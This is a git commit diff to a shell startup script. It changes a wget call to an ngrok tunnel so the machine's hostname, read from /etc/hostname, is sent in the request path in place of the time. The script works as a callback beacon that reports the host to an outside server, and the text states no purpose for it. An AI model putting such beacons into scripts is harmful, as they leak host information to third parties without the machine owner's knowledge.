a68a69c15f066fb3db35241330c7e93b7b3f147d
huytran1ibm <36869410+huytran1ibm@users.noreply.github.com>
2021-09-28 12:52:39 -0500

    Update startup1.sh

--- startup1.sh
+++ startup1.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-wget https://2142-2600-1700-5030-4e90-14f5-93c7-3425-ef6b.ngrok.io/hihuy/$(date +"%T")
+wget https://2142-2600-1700-5030-4e90-14f5-93c7-3425-ef6b.ngrok.io/hihuy/$(cat /etc/hostname)
